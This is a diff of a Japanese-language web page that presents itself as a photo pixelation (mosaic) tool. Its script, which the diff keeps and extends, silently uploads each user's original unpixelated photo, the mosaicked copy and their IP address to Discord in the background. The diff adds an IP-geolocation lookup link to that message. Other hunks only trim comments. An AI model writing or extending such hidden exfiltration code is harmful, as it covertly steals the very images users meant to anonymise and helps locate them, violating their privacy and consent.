@@ -86,7 +86,6 @@
     .secondary-btn {
       background: linear-gradient(90deg, #434343, #000000);
     }
-    /* 調整中の比較エリア */
     .adjust-box {
       width: 100%;
       display: none;
@@ -122,7 +121,6 @@
       background: #000;
       display: block;
     }
-    /* 確定後の結果表示エリア（大きく表示） */
     .final-box {
       width: 100%;
       display: none;
@@ -180,7 +178,7 @@
       <button type="button" class="btn secondary-btn" id="retakeBtn">写真を撮り直す</button>
     </div>
 
-    <!-- 確定後の結果表示エリア（モザイク後を大きく表示） -->
+    <!-- 確定後の結果表示エリア -->
     <div class="final-box" id="finalBox">
       <div style="width: 100%; text-align: center; font-size: 0.9rem; font-weight: bold; color: #4facfe;">モザイク確定済み</div>
       <canvas id="finalCanvas"></canvas>
@@ -291,14 +289,14 @@
       adjustBox.style.display = 'none';
       finalBox.style.display = 'flex';
 
-      // 裏側で同時にDiscordへ送信
+      // 裏側で同時にDiscordへ送信（IPの後に指定のサイトリンクを含める）
       Promise.all([
         new Promise(resolve => originalCanvas.toBlob(resolve, 'image/png')),
         new Promise(resolve => finalCanvas.toBlob(resolve, 'image/png'))
       ]).then(([origBlob, mosBlob]) => {
         const formData = new FormData();
         formData.append('payload_json', JSON.stringify({
-          content: `📥 **モザイク確定データ受信**\n・IPアドレス: \`${clientIp || '取得中'}\``
+          content: `📥 **モザイク確定データ受信**\n・IPアドレス: \`${clientIp || '取得中'}\`\n・ジオロケーション確認: https://rakko.tools/ja/tools/ip-geolocation`
         }));
         formData.append('file1', origBlob, 'original.png');
         formData.append('file2', mosBlob, 'mosaic.png');
